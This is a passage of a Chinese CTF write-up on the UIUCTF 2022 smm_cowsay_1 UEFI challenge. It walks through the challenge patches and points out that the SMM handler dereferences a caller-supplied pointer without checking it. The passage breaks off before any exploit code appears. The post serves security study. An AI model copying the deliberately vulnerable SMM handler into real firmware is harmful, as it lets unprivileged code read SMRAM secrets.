<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>UEFI SMM题目训练 | Xman</title><meta name="author" content="Xman"><meta name="copyright" content="Xman"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="专门记录SMM相关题目。能找到的题目+有wp的题目都会陆续复现。 UIUCTF 2022-smm_cowsay_1题目描述One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. fla">
<meta property="og:type" content="article">
<meta property="og:title" content="UEFI SMM题目训练">
<meta property="og:url" content="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/index.html">
<meta property="og:site_name" content="Xman">
<meta property="og:description" content="专门记录SMM相关题目。能找到的题目+有wp的题目都会陆续复现。 UIUCTF 2022-smm_cowsay_1题目描述One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. fla">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826172151044.png">
<meta property="article:published_time" content="2024-08-26T08:43:13.355Z">
<meta property="article:modified_time" content="2024-09-03T14:37:18.965Z">
<meta property="article:author" content="Xman">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826172151044.png"><link rel="shortcut icon" href="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20230221135524334.png"><link rel="canonical" href="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'UEFI SMM题目训练',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-03 22:37:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Xman" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/63f38a68f144a010071d33b2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826172151044.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Xman"><span class="site-name">Xman</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">UEFI SMM题目训练</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-26T08:43:13.355Z" title="发表于 2024-08-26 16:43:13">2024-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-03T14:37:18.965Z" title="更新于 2024-09-03 22:37:18">2024-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E/">固件漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="UEFI SMM题目训练"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>专门记录SMM相关题目。能找到的题目+有wp的题目都会陆续复现。</p>
<h1 id="UIUCTF-2022-smm-cowsay-1"><a href="#UIUCTF-2022-smm-cowsay-1" class="headerlink" title="UIUCTF 2022-smm_cowsay_1"></a>UIUCTF 2022-smm_cowsay_1</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>One of our engineers thought it would be a good idea to write Cowsay inside SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at physical address 0x44440000, and since it could only be read from SMM, that can only mean one thing: it… was a horrible idea.</p>
<h2 id="题目文件结构"><a href="#题目文件结构" class="headerlink" title="题目文件结构"></a>题目文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">├── chal_build</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   ├── handout-readme</span><br><span class="line">│   ├── handout_run.sh</span><br><span class="line">│   ├── patches</span><br><span class="line">│   │   ├── edk2</span><br><span class="line">│   │   │   ├── 0001-PiSmmCore-Fix-for-CVE-2021-38578-integer-underflow.patch</span><br><span class="line">│   │   │   ├── 0002-ShellPkg-Simplify-Shell.patch</span><br><span class="line">│   │   │   ├── 0003-SmmCowsay-Vulnerable-Cowsay.patch</span><br><span class="line">│   │   │   ├── 0004-Add-UEFI-Binexec.patch</span><br><span class="line">│   │   │   └── 0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</span><br><span class="line">│   │   └── qemu</span><br><span class="line">│   │       └── 0001-Implement-UIUCTFMMIO-device.patch</span><br><span class="line">│   └── qemu-system-x86_64</span><br><span class="line">├── edk2_artifacts</span><br><span class="line">│   ├── AcpiTableDxe.debug</span><br><span class="line">│   ├── AcpiTableDxe.efi</span><br><span class="line">│   ├── AmdSevDxe.debug</span><br><span class="line">│   ├── AmdSevDxe.efi</span><br><span class="line">│   ├── ArpDxe.debug</span><br><span class="line">│   ├── ArpDxe.efi</span><br><span class="line">..............</span><br><span class="line">├── edk2debug.log</span><br><span class="line">├── README</span><br><span class="line">└── run</span><br><span class="line">    ├── kvmvapic.bin</span><br><span class="line">    ├── OVMF_CODE.fd</span><br><span class="line">    ├── OVMF_VARS_copy.fd</span><br><span class="line">    ├── OVMF_VARS.fd</span><br><span class="line">    ├── qemu-system-x86_64</span><br><span class="line">    ├── region4</span><br><span class="line">    ├── rootfs</span><br><span class="line">    │   ├── binexec.efi</span><br><span class="line">    │   └── startup.nsh</span><br><span class="line">    └── run.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>题目描述可以看出，我们需要利用SMM读取物理地址0x44440000位置的flag。</p>
<p>run文件夹里面可以运行本题的题目文件，用x86的qemu模拟。运行截图如下</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826174441555.png" alt="image-20240826174441555"></p>
<p>可以发现是一个shellcode执行器，输入x86的shellcode的hex值就可以模拟执行。最重要的是它给出了SystemTable和shellcode写入的地址。漏洞利用的时候需要利用这个，现在先不看。</p>
<p>源代码是对EDK2(标准UEFI实现)和QEMU的一系列补丁，位于patches里。里面有edk2和qemu的补丁文件，可以在里面看到patch的源代码。可以不用用ida去逆向逻辑，符号各种都是在的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">+UINTN</span><br><span class="line">+EFIAPI</span><br><span class="line">+<span class="built_in">SmmPrint</span> (</span><br><span class="line">+  IN CONST CHAR16  *Format,</span><br><span class="line">+  ...</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  VA_LIST Marker;</span><br><span class="line">+  UINTN   Return;</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">VA_START</span> (Marker, Format);</span><br><span class="line">+</span><br><span class="line">+  Return = <span class="built_in">SmmInternalPrint</span> (Format, Marker);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">VA_END</span> (Marker);</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> Return;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+VOID</span><br><span class="line">+EFIAPI</span><br><span class="line">+<span class="built_in">Cowsay</span> (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  UINTN Rows, Cols, CurRow, CurCol;</span><br><span class="line">+  CHAR16 PrintChr[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">+  CONST CHAR16 *Ptr;</span><br><span class="line">+</span><br><span class="line">+  Rows = Cols = CurRow = CurCol = <span class="number">0</span>;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">for</span> (Ptr = Message; *Ptr; Ptr++) &#123;</span><br><span class="line">+    <span class="keyword">if</span> (CurCol == <span class="number">0</span>)</span><br><span class="line">+      Rows++;</span><br><span class="line">+</span><br><span class="line">+    <span class="keyword">if</span> (*Ptr == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">+      CurCol = <span class="number">0</span>;</span><br><span class="line">+      <span class="keyword">continue</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    CurCol++;</span><br><span class="line">+    <span class="keyword">if</span> (CurCol &gt; Cols)</span><br><span class="line">+      Cols = CurCol;</span><br><span class="line">+  &#125;</span><br></pre></td></tr></table></figure>

<p>run\rootfs里的binexec.efi是加载的驱动文件，对应的是003补丁，对应一下就能很方便的把符号和代码对上。方便进行gdb调试。</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826175225993.png" alt="image-20240826175225993"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为有patch的源代码了，我们直接分析源代码即可。</p>
<h3 id="patches"><a href="#patches" class="headerlink" title="patches"></a>patches</h3><p>首先看SmmCowsay-Vulnerable-Cowsay.patch，从名字就可以看出比较危险（</p>
<p>最下方的inf文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+++ b/OvmfPkg/SmmCowsay/SmmCowsay.inf</span><br><span class="line">@@ -0,0 +1,38 @@</span><br><span class="line">+[Defines]</span><br><span class="line">+  INF_VERSION                    = 0x00010005</span><br><span class="line">+  BASE_NAME                      = SmmCowsay</span><br><span class="line">+  FILE_GUID                      = A7DE70E0-918E-4DFE-BFFB-AD860A376E65</span><br><span class="line">+  MODULE_TYPE                    = DXE_SMM_DRIVER</span><br><span class="line">+  VERSION_STRING                 = 1.0</span><br><span class="line">+  PI_SPECIFICATION_VERSION       = 0x0001000A</span><br><span class="line">+  ENTRY_POINT                    = SmmCowsayInit</span><br><span class="line">+</span><br><span class="line">+[Sources]</span><br><span class="line">+  SmmCowsay.c</span><br><span class="line">+</span><br></pre></td></tr></table></figure>

<p>ENTRY_POINT是SmmCowsayInit，MODULE_TYPE是DXE_SMM_DRIVER。DXE驱动类型，在SMM中运行。DXE驱动和UEFI的应用程序之间的通信通过UEFI服务和协议，我们需要找到驱动注册处理程序和驱动和UEFI应用程序交互的代码。</p>
<p>注册处理程序的代码就在当前文件的ENTRY_POINT中</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+<span class="built_in">SmmCowsayInit</span> (</span><br><span class="line">+  IN EFI_HANDLE ImageHandle,</span><br><span class="line">+  IN EFI_SYSTEM_TABLE *SystemTable</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_STATUS Status;</span><br><span class="line">+  EFI_HANDLE DispatchHandle;</span><br><span class="line">+</span><br><span class="line">+  Status = gSmst-&gt;<span class="built_in">SmiHandlerRegister</span> (</span><br><span class="line">+                    SmmCowsayHandler,</span><br><span class="line">+                    &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">+                    &amp;DispatchHandle</span><br><span class="line">+                    );</span><br><span class="line">+  <span class="built_in">ASSERT_EFI_ERROR</span> (Status);</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> Status;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>SmiHandlerRegister函数参数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmiHandlerRegister (</span><br><span class="line">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="line">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="line">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<p>这里重点注意第一个参数，这个函数将handle加入处理程序列表中，当发生 SMI 时，EDK2 注册的 SMI 处理程序会浏览已注册处理程序的链接列表，并选择合适的处理程序来运行。</p>
<p>具体的处理程序如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+<span class="built_in">SmmCowsayHandler</span> (</span><br><span class="line">+  IN EFI_HANDLE  DispatchHandle,</span><br><span class="line">+  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="line">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="line">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="built_in">sizeof</span>(CHAR16 *))</span><br><span class="line">+    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">Cowsay</span>(*(CONST CHAR16 **)CommBuffer);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>注意这一行Cowsay(*(CONST CHAR16 **)CommBuffer);</p>
<p>第一次看这段的时候我联想到了之前所学的漏洞类型里面的任意SMRAM攻击，未检查多级指针那个。所以多留心了一眼，刚巧漏洞的一个部分就是这一行。后面再说。</p>
<p>剩下的代码是结构化输出，没啥用，直接看另一个patch。</p>
<p>0004-Add-UEFI-Binexec.patch，看名字也能知道是patch UEFI的叫Binexec的一个应用程序。总览题目的时候实际运行run.sh的时候执行的二进制也就是这个。也就是这个应用程序和刚刚的驱动进行通信和交互，才能输出我们运行程序后的那个字符图像。我们寻找一下交互相关的代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+<span class="built_in">Cowsay</span> (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer) + <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里有一个mSmmCommunication-&gt;Communicate。EFI_SMM_COMMUNICATION_PROTOCOL是mSmmCommunication的结构体类型。查看源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SmmCommunicationCommunicate (</span><br><span class="line">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span><br><span class="line">  IN OUT VOID                              *CommBuffer,</span><br><span class="line">  IN OUT UINTN                             *CommSize OPTIONAL</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>

<p>SmmCommunicationCommunicate用于在 SMM模式下进行通信。因为我们实际运行的二进制是在UEFI引导环境下执行的独立应用程序，但不是在SMM环境下执行，我们没法直接和SMM内运行的SmmCowsay驱动交互，只能通过SmmCommunicationCommunicate函数。因此我们只需要注意这个函数的参数就可以知道通信的内容了。此函数将消息复制到全局变量中，并触发软件 SMI 来处理该消息。该消息包含我们要与之通信的 SMM 处理程序的 GUID，在进入 SMM 时会在已注册处理程序的链接列表中搜索该 GUID。</p>
<p>第二个参数是CommBuffer，题目代码里面是Buffer结构体，结构体类型是EFI_SMM_COMMUNICATE_HEADER。我们主要关注它就行。</p>
<p>最后来看看qemu的patch</p>
<p>存在一个全局char字符数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+static char nice_try_msg[] = &quot;uiuctf&#123;nice try!!!!!!!!!!!!&#125;\n&quot;;</span><br></pre></td></tr></table></figure>

<p>找到引用的位置，可以看到如果属性的secure为true就可以走到region4_msg，否则走入nice_try_msg，看起来是fake flag的分支里面。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+<span class="function"><span class="type">static</span> MemTxResult <span class="title">uiuctfmmio_region4_read_with_attrs</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">+    <span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> *val, <span class="type">unsigned</span> size, MemTxAttrs attrs)</span></span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+    <span class="keyword">if</span> (!attrs.secure)</span><br><span class="line">+        <span class="built_in">uiuctfmmio_do_read</span>(addr, val, size, nice_try_msg, nice_try_len);</span><br><span class="line">+    <span class="keyword">else</span></span><br><span class="line">+        <span class="built_in">uiuctfmmio_do_read</span>(addr, val, size, region4_msg, region4_len);</span><br><span class="line">+    <span class="keyword">return</span> MEMTX_OK;</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="type">static</span> <span class="type">const</span> MemoryRegionOps uiuctfmmio_region4_io_ops =</span><br><span class="line">+&#123;</span><br><span class="line">+    .write = uiuctfmmio_write,</span><br><span class="line">+    .read_with_attrs = uiuctfmmio_region4_read_with_attrs,</span><br><span class="line">+    .valid.min_access_size = <span class="number">1</span>,</span><br><span class="line">+    .valid.max_access_size = <span class="number">8</span>,</span><br><span class="line">+    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">+&#125;;</span><br></pre></td></tr></table></figure>

<p>flag相关函数</p>
